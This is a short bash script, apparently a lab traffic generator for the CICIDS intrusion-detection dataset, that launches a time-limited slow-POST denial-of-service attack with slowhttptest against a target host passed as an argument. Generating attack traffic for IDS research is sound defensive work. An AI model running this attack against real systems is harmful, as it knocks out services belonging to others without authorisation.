#!/usr/bin/env bash
# 08 DoS Slowhttptest — yavaş POST gövdesi (CICIDS: DoS Slowhttptest). Sınırlı.
set -uo pipefail
VIC="${1:-10.10.10.30}"; DUR="${2:-20}"
echo "[dos-slowhttp] slowhttptest -B $VIC:80 (${DUR}s)"
if command -v slowhttptest >/dev/null 2>&1; then
  slowhttptest -c 500 -B -g -i 10 -r 100 -t POST -u "http://$VIC/" -x 24 -p 3 -l "$DUR" 2>&1 | tail -4 || true
else
  echo "[dos-slowhttp] slowhttptest yok → atlandı"
fi
echo "[dos-slowhttp] done"
